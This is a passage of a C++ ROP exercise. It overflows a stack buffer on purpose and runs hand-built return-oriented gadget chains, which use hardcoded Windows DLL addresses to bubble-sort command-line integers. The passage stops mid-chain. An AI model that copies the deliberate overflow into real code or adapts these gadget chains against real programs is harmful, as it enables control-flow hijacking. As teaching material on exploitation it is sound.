// ROPMatrixMult.cpp : Defines the entry point for the console application.
//

#pragma check_stack(off)
#include <string.h>
#include <stdio.h>
#include <cstdlib>
#include <stdlib.h>
#define VARS_SIZE 2048

int vars[VARS_SIZE];

const char newBuff[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	// fill up buffer (16)
						"\x00\x00\x00\x00"								// fill up rest of stack until return address
						"\x20\x10\x40\x00"								// &flagBeginGadgets
						"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
						"\x00\xFB\x12\x00"								// 0x0012FB00 - &newerStack[0]
						;

void hack(void) {
	printf("Buffer overflowed!\n");
}

void flagBeginGadgets(void) {
	//printf("\n\nstarting\n\n");
	printf("");

	__asm{
		or eax,eax
		or eax,eax
		or eax,eax
	}
}

void flagEndGadgets(void) {
	__asm{
		or ebx,ebx
		or ebx,ebx
		or ebx,ebx
	}
}

void printAnswer(void) {
	int count, size;
	flagEndGadgets();
	size = vars[100];

	for(count = 0; count < size; count++) printf("%d, ", vars[200+count]);
	printf("\n");

	/*
	printf("size = %d\n", vars[100]);
	printf("i    = %d\n", vars[101]);
	printf("j    = %d\n", vars[102]);
	printf("a    = %08X\n", vars[104]);
	printf("b    = %08X\n", vars[105]);
	printf("c    = %d\n", vars[106]);
	printf("d    = %d\n", vars[107]);
	*/
	
	exit(0);
}

void printAddresses(void) {
    printf("Address of hack             = %p\n", hack);
    printf("Address of printAnswer      = %p\n", printAnswer);
    printf("Address of flagBeginGadgets = %p\n", flagBeginGadgets);
    printf("Address of flagEndGadgets   = %p\n", flagEndGadgets);
	printf("Address of vars             = %p\n", &vars);
	printf("Address of size             = %p\n", &vars[100]);
	printf("Address of i                = %p\n", &vars[101]);
	printf("Address of j                = %p\n", &vars[102]);
	printf("Address of array[0]         = %p\n", &vars[200]);
	printf("Address of newBuff[0]       = %p\n", &newBuff[0]);

	//printf("size_t = %u\n", SIZE_MAX);
	//printf("SIZEOF NEWBUFF = %d\n", sizeof(newbuf)-1);
	//printf("\nsize = %d\ni = %d\nj = %d\n", vars[100], vars[101], vars[102]);
}


void exploit() {
	char buf[16];
	//printf("Length of newerStack     = %d\n", sizeof(newerStack) / sizeof(newerStack[0]));
	memcpy(buf, newBuff, sizeof(newBuff)-1);		// Where the buffer overflow occurs
	return;
}

int main(int argc, char* argv[]) {
	//char extraSpace[32768];
	int i;
	
	for(i = 0; i < VARS_SIZE; i++) vars[i] = 0;
	vars[100] = atoi(argv[1]);					// size = the first argument
	for(i = 0; i < vars[100]; i++) vars[200+i] = atoi(argv[2+i]);
	//printAddresses();							// Makes debugging easier
	
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	char newerStack[] =	
							// BubbleSort setup

							// i = size - 1
							//	Move size into eax then decrement
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xA8\x31\x40\x00"								// 0x004031A8 - &size
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - dec eax; ret;
							//	Move eax into i
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xAC\x31\x40\x00"								// 0x004031AC - &i
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							
							//	Go to other label
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\x04\xFA\x12\x00"								// 0x0012FA04 - &labelA[0]
							;
	
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	char labelA[] = 
							// Conditional
							// if(i>=0) jump; else continue;
							//	if(i<0) set CF by performing i+80000000
							//			Load [i] into eax 
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xAC\x31\x40\x00"								// 0x004031AC - &i
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Load 80000000 into esi
							"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
							"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
							"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
							"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
							"\x95\x52\x91\x7C"								// 0x7C915295 - neg eax; pop ebp; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;				-- if(n<0) eax=0; else if(n>=0) eax=1;
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=2;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=4;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=8;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// Random extra ret to put a breakpoint at in a debugger
							"\x14\x14\x93\x7C"								// 0x7C931414 - ret;
							//	if(n<0) esp=esp;	else if(n>=0) esp = esp+8;
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// Go to different parts of the code depending on outcome of conditional
							//	if(n<0) continue...
							"\xF2\x11\x90\x7C"								// 0x7C9011F2 - ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							//	else if(n>=0) jump...
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\xC8\xFC\x12\x00"								// 0x0012FCC8 - &ifTrue -- (&labelE)
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							// Optional... &ifFalse
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\xB8\xFA\x12\x00"								// 0x0012FAB8 - &ifFalse -- (&labelF)

							// Because I don't feel like taking these out then then having to readjust the label addresses
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							;
						

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	char labelE[] = 
							// j = 1
							//	Move 1 into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\x01\x00\x00\x00"								// 0x00000001 - imm 1
							//	Move eax into j
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB0\x31\x40\x00"								// 0x004031B0 - &j
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Go to other label
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\xC4\xFB\x12\x00"								// 0x0012FBC4 - &labelB[0]
							;


	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	char labelB[] = 
							// if(j <= i) == if(j - i <= 0) == if(i - j >= 0) == if(g >= 0)
							// Set g = i - j
							//	Move i into eax, then into g
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xAC\x31\x40\x00"								// 0x004031AC - &i
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xD0\x31\x40\x00"								// 0x004031D0 - &g
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move j into eax, negate, then then add to g
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\xB0\x31\x40\x00"								// 0x004031B0 - &j
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\xBE\xC1\x77"								// 0x77C1BE18 - neg eax; pop ebp; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xD0\x31\x40\x00"								// 0x004031D0 - &g
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret

							// Conditional
							// if(g>=0) jump; else continue;
							//	if(g<0) set CF by performing i+80000000
							//			Load [g] into eax 
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xD0\x31\x40\x00"								// 0x004031D0 - &g
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Load 80000000 into esi
							"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
							"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
							"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
							"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
							"\x95\x52\x91\x7C"								// 0x7C915295 - neg eax; pop ebp; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;				-- if(n<0) eax=0; else if(n>=0) eax=1;
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=2;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=4;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=8;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// Random extra ret to put a breakpoint at in a debugger
							"\x14\x14\x93\x7C"								// 0x7C931414 - ret;
							//	if(n<0) esp=esp;	else if(n>=0) esp = esp+8;
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// Go to different parts of the code depending on outcome of conditional
							//	if(n<0) continue...
							"\xF2\x11\x90\x7C"								// 0x7C9011F2 - ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							//	else if(n>=0) jump...
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\xF4\xFC\x12\x00"								// 0x0012FCF4 - &ifTrue -- &labelG
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							// Optional... &ifFalse
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\x3C\xFF\x12\x00"								// 0x0012FF3C - &ifFalse -- &labelD
							;



	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	char labelG[] = 

							// d .= numbers[j-1] = vars[200+j-1] = *(&vars[0] + ((200 + j - 1)<<2)) = *(a)
							//	a = j - 1 + 200
							//		Move j into eax then decrement
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB0\x31\x40\x00"								// 0x004031B0 - &j
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - dec eax; ret;
							//		Move eax into a
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB8\x31\x40\x00"								// 0x004031B8 - &a
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//		Add 200 to a
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC8\x00\x00\x00"								// 0x000000C8 - imm 200
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xB8\x31\x40\x00"								// 0x004031B8 - &a
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//		Move a into eax, then multiply by 4 [via 2 shift lefts], then move back into a
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB8\x31\x40\x00"								// 0x004031B8 - &a
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB8\x31\x40\x00"								// 0x004031B8 - &a
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//		Add &vars[0] to a
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\x18\x30\x40\x00"								// 0x00403018 - &vars[0]
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xB8\x31\x40\x00"								// 0x004031B8 - &a
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//		Move *a into d by moving a into eax, then replacing eax with [eax], then moving eax into d
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB8\x31\x40\x00"								// 0x004031B8 - &a
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC4\x31\x40\x00"								// 0x004031C4 - &d
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

							//	c .= numbers[j] = *(&numbers[j-1]+4) = *(a+4) = *(b)
							//	TODO: numbers[j-1] = *(a) .= c
							//		Move a into eax, then add 4
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB8\x31\x40\x00"								// 0x004031B8 - &a
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;
							//		Move eax into b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xBC\x31\x40\x00"								// 0x004031BC - &b
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//		Move *b into c by moving b into eax, then replacing eax with [eax], then moving eax into c
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xBC\x31\x40\x00"								// 0x004031BC - &b
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC0\x31\x40\x00"								// 0x004031C0 - &c
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm 


							// if(numbers[j-1] > numbers[j]) == if(d > c) == if(d - c > 0) == if(f > 0)
							// Set f = d - c
							// f = d + c
							//	Move d into eax, then into f
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC4\x31\x40\x00"								// 0x004031C4 - &d
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xCC\x31\x40\x00"								// 0x004031CC - &f
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move c into eax, negate, then then add to f
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\xC0\x31\x40\x00"								// 0x004031C0 - &c
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\xBE\xC1\x77"								// 0x77C1BE18 - neg eax; pop ebp; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xCC\x31\x40\x00"								// 0x004031CC - &f
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret

							// Conditional
							// if(f>=0) jump; else continue;
							//	if(f<0) set CF by performing i+80000000
							//			Load [f] into eax 
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xCC\x31\x40\x00"								// 0x004031CC - &f
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Load 80000000 into esi
							"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
							"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
							"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
							"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
							"\x95\x52\x91\x7C"								// 0x7C915295 - neg eax; pop ebp; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;				-- if(n<0) eax=0; else if(n>=0) eax=1;
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=2;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=4;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=8;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// Random extra ret to put a breakpoint at in a debugger
							"\x14\x14\x93\x7C"								// 0x7C931414 - ret;
							//	if(n<0) esp=esp;	else if(n>=0) esp = esp+8;
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// Go to different parts of the code depending on outcome of conditional
							//	if(n<0) continue...
							"\xF2\x11\x90\x7C"								// 0x7C9011F2 - ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							//	else if(n>=0) jump...
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\x3C\xFB\x12\x00"								// 0x0012FB3C - &ifTrue -- &labelC
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							// Optional... &ifFalse
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\xC0\xFA\x12\x00"								// 0x0012FAC0 - &ifFalse -- &labelH
							;
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
						
	char labelC[] = 
							//IF COND IS TRUE:
							//		*a = c
							//			Move a into eax then move that into ecx
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB8\x31\x40\x00"								// 0x004031B8 - &a
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							//			Move c into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC0\x31\x40\x00"								// 0x004031C0 - &c
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Move c (eax) into a* ([ecx])
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

							// numbers[j] = *b .= d;
							//		*b = d
							//			Move b into eax then move that into ecx
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xBC\x31\x40\x00"								// 0x004031BC - &b
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							//			Move c into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC4\x31\x40\x00"								// 0x004031B4 - &d
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Move c (eax) into a* ([ecx])
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\xC0\xFA\x12\x00"								// 0x0012FAC0 - &labelH
							;

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	char labelH[] =			// j++ then jump to B
							// j = j + 1
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB0\x31\x40\x00"								// 0x004031B0 - &j
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x88\x98\x97\x7C"								// 0x7C979888 - inc eax; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB0\x31\x40\x00"								// 0x004031B0 - &j
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
